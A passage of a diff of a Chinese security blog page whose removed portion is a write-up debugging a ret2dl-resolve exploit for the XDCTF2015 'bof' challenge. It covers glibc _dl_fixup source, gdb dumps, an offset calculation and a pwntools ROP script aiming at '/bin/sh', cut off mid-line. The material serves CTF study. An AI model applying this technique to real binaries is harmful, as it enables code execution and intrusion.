@@ -1,1335 +1,181 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>ph4ntom&#39;s blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The wheel turns,nothing is ever new">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ph4ntom's blog</title><meta name="author" content="ph4ntom"><meta name="copyright" content="ph4ntom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="The wheel turns,nothing is ever new">
 <meta property="og:type" content="website">
 <meta property="og:title" content="ph4ntom&#39;s blog">
 <meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="ph4ntom&#39;s blog">
 <meta property="og:description" content="The wheel turns,nothing is ever new">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/img/avatar.jpg">
 <meta property="article:author" content="ph4ntom">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="ph4ntom&#39;s blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-<meta name="generator" content="Hexo 5.2.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">ph4ntom&#39;s blog</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-ret2dl" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/11/13/ret2dl/" class="article-date">
-  <time datetime="2020-11-13T03:45:20.000Z" itemprop="datePublished">2020-11-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/13/ret2dl/">ret2dl</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Ret2dl-What"><a href="#Ret2dl-What" class="headerlink" title="Ret2dl?What?"></a>Ret2dl?What?</h1><p>直接贴链接，不再赘述 <a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
-<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
-<li>Ubuntu 18.04</li>
-<li>glibc 2.27</li>
-</ul>
-<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>首先，我按照 <a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> 中的payload进行了调试，自行调整，一直到stage 4，大体都是ok的，原理也比较清晰易懂，修改的地方也不是很多</p>
-<p>但是，在stage 4时，却一直无法成功，于是我先仔细研究了payload，发现和作者步骤过程基本一致，与ctf-wiki上也是大差不差，但是却一直报非法内存地址访问。</p>
-<p>嘛，那就gdb大法呗～</p>
-<h2 id="确定报错位置"><a href="#确定报错位置" class="headerlink" title="确定报错位置"></a>确定报错位置</h2><p>首先先确定了报错位置</p>
-<p><img src="/image/ret2dl/error.png" alt="error"></p>
-<p>可以看到，此时的edx所指向的内存地址是无法访问的，故而在<code>0xf7fd6fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</code> 尝试取值的过程中，程序崩溃退出</p>
-<p>那么为何在payload几乎相同的情况下，却会发生这种问题呢，带着疑惑，继续向下看</p>
-<h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>其实一开始我是以为我哪里写错了，所以浪费了一些时间去校对代码，但是无果</p>
-<p>于是只能用最直接的方法，看看glibc的实现，找到为何会出现这个问题</p>
-<p>报错部分的源代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* This function is called through a special trampoline from the PLT the</span><br><span class="line">   first time each PLT entry is called.  We must perform the relocation</span><br><span class="line">   specified in the PLT of the given shared object, and return the resolved</span><br><span class="line">   function address to the trampoline, which will restart the original call</span><br><span class="line">   to that address.  Future calls will bounce directly from the PLT to the</span><br><span class="line">   function.  *&#x2F;</span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  const ElfW(Sym) *const symtab</span><br><span class="line">    &#x3D; (const void *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  const char *strtab &#x3D; (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  const PLTREL *const reloc</span><br><span class="line">    &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  const ElfW(Sym) *refsym &#x3D; sym;</span><br><span class="line">  void *const rel_addr &#x3D; (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  lookup_t result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Sanity check that we&#39;re really looking at a PLT relocation.  *&#x2F;</span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   &#x2F;* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="line">      used don&#39;t look in the global scope.  *&#x2F;</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) &#x3D;&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] !&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  const ElfW(Half) *vernum &#x3D;</span><br><span class="line">	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">	  version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  if (version-&gt;hash &#x3D;&#x3D; 0)</span><br><span class="line">	    version &#x3D; NULL;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过比对汇编与源代码，我找到了报错语句为<code>if (version-&gt;hash == 0)</code> ,也就是说在尝试获取<code>version</code>结构体中的<code>hash</code>成员值时出错了</p>
-<p>那这个<code>version</code>又是什么？</p>
-<p>这里要感谢这位师傅的分析，给了我一点启示 <a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/260">https://forum.90sec.com/t/topic/260</a> </p>
-<p>总的来说，原理大概可以概括为，在<code>_dl_fixup</code>中，需要校验符号的版本(version)，而这个<code>version</code>值是这样取的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，ndx作为<code>l_versions</code>成员的下标，其取值与<code>sym</code>的取值十分相似</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>symtab</code>就是<code>.dynsym</code>节的起始地址，而其中的<code>reloc-&gt;r_info</code>则是我们所控制的值，此值被同时用于<code>version</code>以及<code>sym</code>的取值</p>
-<p>所以也就是说，在我们满足了劫持<code>sym</code>至我们伪造的<code>sym</code>结构体上的同时，我们也必须兼顾<code>version</code>的取值，如果我们所伪造的<code>reloc-&gt;r_info</code>值不恰当，那么就可能导致<code>version</code>取值出现错误</p>
-<p>而这个<code>reloc-&gt;r_info</code>值实际上与我们在exp中向<code>.bss</code>节上写入payload的时候选择的初始偏移有关，故而包括ctf-wiki以及很多网上的payload中所谓的“向<code>bss+0x800</code>偏移处写入payload是为了防止<code>_dl_fixup</code>会引用位置较低的地方”这个解释是不完全正确的，实际上需要在<code>.bss</code>节上加一段偏移主要还是为了保证<code>reloc-&gt;r_info</code>能在一个合理的区间之内，使得<code>sym</code>以及<code>version</code>都能被正确的取值</p>
-<p>而我们所希望的，就是使得<code>version</code>能够取值到<code>null</code>(具体可以详细看上面师傅的文章),为了达到这一点，我们就需要使得<code>ndx</code>的值尽可能为0(因为<code>l-&gt;l_versions[0]</code>一般为<code>null</code>)</p>
-<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>那么，我就来详细分析一下步骤，以及如何尽可能保证<code>ndx</code>的值能够取到0</p>
-<p>首先，在向<code>.bss</code>节上写入payload的时候选择的初始偏移越大，意味着我们所伪造的<code>sym</code>结构体相对于<code>.dynsym</code>节的起始位置的偏移距离也会越大</p>
-<p>这一偏移距离与我们所伪造的<code>reloc-&gt;r_info</code>值息息相关</p>
-<p>而<code>reloc-&gt;r_info</code>值则关系到了<code>ndx</code>的值</p>
-<p>有关<code>ndx</code>取值代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编代码如下，其中<code>esi</code>的值<code>0x269</code>是我们伪造的<code>reloc-&gt;r_info</code>的值，<code>edx</code>是<code>.gnu.version</code>的起始地址，并且此时选择的<code>.bss</code>的初始偏移距离为<code>0x800</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x080482d8</span><br><span class="line">$esi   : 0x269</span><br><span class="line">......</span><br><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br><span class="line">0xf7f45fde &lt;_dl_fixup+110&gt;  and    edx, 0x7fff</span><br></pre></td></tr></table></figure>
-
-<p>当上面的代码执行完成后，<code>edx</code>的值如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x300e   </span><br></pre></td></tr></table></figure>
-
-<p>此时<code>edx</code>的值实际上就是<code>ndx</code>的值</p>
-<p>当前<code>edx+esi*2</code>的值为<code>0x80487aa</code>，其指向的内存空间布局如下，可以看到<code>0x80487aa</code>处双字节数据即<code>0x300e</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">8048714 00000000 20000000 68000000 d6fdffff  .... ...h.......</span><br><span class="line">8048724 46000000 00410e08 8502420d 05448303  F....A....B..D..</span><br><span class="line">8048734 7ec5c30c 04040000 38000000 8c000000  ~.......8.......</span><br><span class="line">8048744 f8fdffff a7000000 00440c01 00471005  .........D...G..</span><br><span class="line">8048754 02750045 0f037574 06100702 757c1003  .u.E..ut....u|..</span><br><span class="line">8048764 02757802 90c10c01 0041c341 c741c543  .ux......A.A.A.C</span><br><span class="line">8048774 0c040400 48000000 c8000000 70feffff  ....H.......p...</span><br><span class="line">8048784 5d000000 00410e08 8502410e 0c870341  ]....A....A....A</span><br><span class="line">8048794 0e108604 410e1483 054e0e20 690e2441  ....A....N. i.$A</span><br><span class="line">80487a4 0e28440e 2c440e30 4d0e2047 0e1441c3  .(D.,D.0M. G..A.</span><br><span class="line">80487b4 0e1041c6 0e0c41c7 0e0841c5 0e040000  ..A...A...A.....</span><br><span class="line">80487c4 10000000 14010000 84feffff 02000000  ................</span><br><span class="line">80487d4 00000000 00000000               </span><br></pre></td></tr></table></figure>
-
-<p>此时程序的整体内存空间布局如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>
-
-<p>可以看到<code>0x80487aa</code>落在了下面这页上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br></pre></td></tr></table></figure>
-
-<p>而我们都知道，内存页未被使用的空间均被<code>0</code>填充</p>
-<p>故而我们可以从上面得到一个信息，从<code>0x80487db</code>-<code>0x08049000</code>这一段区间内，都被0所填充</p>
-<p>那么如果我们可以控制<code>edx+esi*2</code>的值落在这一区间，我们就可以保证<code>ndx</code>的值为0，从而使得<code>version</code>为<code>null</code></p>
-<p>而现在我们的ndx并不是<code>0</code>，所以我们先保留上述观点，继续看下去</p>
-<p>接着执行如下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xf7f5e940  →  0x00000000</span><br><span class="line">$edx   : 0x300e0</span><br><span class="line">......</span><br><span class="line">0xf7f45fe4 &lt;_dl_fixup+116&gt;  shl    edx, 0x4</span><br><span class="line">0xf7f45fe7 &lt;_dl_fixup+119&gt;  add    edx, DWORD PTR [eax+0x170]</span><br><span class="line">0xf7f45fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</span><br></pre></td></tr></table></figure>
-
-<p>当前<code>eax+0x170</code>中保存的地址是这样的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;wx $eax+0x170</span><br><span class="line">0xf7fb4ab0:	0xf7f873f0       </span><br></pre></td></tr></table></figure>
-
-<p>第二句汇编执行完成后，<code>edx</code>的值如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0xf7fcb6b0</span><br></pre></td></tr></table></figure>
-
-<p>此时内存布局是这样的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>
-
-<p>可以看到此时<code>edx</code>的值已经处在了无法访问的内存区域，故而当执行到第三句汇编时，程序就会崩溃</p>
-<p>综上所述，我们可以知道，我们选择的<code>.bss</code>节的初始偏移的大小应当严格控制，必须使偏移的大小能够让如下语句中的<code>edx+esi*2</code>落在规定的区间内，否则就会导致错误(当然，如果没有落在规定区间内，也有几率成功，因为基于上面<code>edx+esi*2</code>所指向的部分内存空间,我们可以看到存在一些双字节数据为<code>0x0000</code>,当<code>edx+esi*2</code>指向的数据为这些特殊位置时，也可以成功)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br></pre></td></tr></table></figure>
-
-<p>我们也可以通过计算，得出<code>.bss</code>至少应当被抬高的偏移值</p>
-<p>由于<code>edx+esi*2</code>与<code>.gnu.version</code>节的起始地址之间最小的距离应当为<code>0x80487db-0x80482d8=0x503</code></p>
-<p>所以此时<code>esi</code>应当为<code>0x503/0x2=0x282</code>(向上取整)</p>
-<p>也就是说，我们伪造的<code>reloc-&gt;r_info</code>最小值应当为<code>0x282</code></p>
-<p>反推最小抬高距离(在我的payload情况下),<code>0x80481cc</code>+<code>0x10</code>*<code>0x282</code>-<code>0x804a000</code>-<code>0x50</code>=<code>0x99c</code></p>
-<p>其中<code>0x80481cc</code>为<code>.dynsym</code>节的起始地址，<code>0x804a000</code>为<code>.bss</code>节的起始地址,<code>0x50</code>为已构造的payload的长度</p>
-<p>附上我的最终payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&#39;bof&#39;)</span><br><span class="line">r &#x3D; process(&#39;.&#x2F;bof&#39;)</span><br><span class="line">rop &#x3D; ROP(&#39;.&#x2F;bof&#39;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line">bss_addr &#x3D; elf.bss()</span><br><span class="line"></span><br><span class="line">readplt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">writeplt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"></span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">stack_size &#x3D; 0x99c</span><br><span class="line">base_stage &#x3D; bss_addr + stack_size</span><br><span class="line">### padding</span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * offset</span><br><span class="line">payload +&#x3D; p32(readplt)</span><br><span class="line">payload +&#x3D; p32(0x08048649) #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(100)</span><br><span class="line">payload +&#x3D; p32(0x0804864b) #pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(0x08048465)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">plt0 &#x3D; elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr</span><br><span class="line">rel_plt &#x3D; elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr</span><br><span class="line">dynsym &#x3D; elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr</span><br><span class="line">dynstr &#x3D; elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr</span><br><span class="line"># got</span><br><span class="line">fake_index &#x3D; base_stage + 20 - rel_plt</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"># info</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 28</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr+align</span><br><span class="line">fake_sym_offset &#x3D; (fake_sym_addr - dynsym)&#x2F;0x10</span><br><span class="line">r_info &#x3D; (fake_sym_offset &lt;&lt; 8) | 0x7</span><br><span class="line">fake_func_str_addr &#x3D; fake_sym_addr+0x10-dynstr</span><br><span class="line">fake_write_sym &#x3D; p32(fake_func_str_addr)+p32(0)+p32(0)+p32(0x12)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(plt0)</span><br><span class="line">payload +&#x3D; p32(fake_index)</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">#payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(base_stage+80)</span><br><span class="line">#payload +&#x3D; p32(len(sh))</span><br><span class="line">payload +&#x3D; p32(write_got)</span><br><span class="line">payload +&#x3D; p32(r_info)</span><br><span class="line">payload +&#x3D; &#39;a&#39; *align</span><br><span class="line">payload +&#x3D; p32(fake_func_str_addr)</span><br><span class="line">payload +&#x3D; 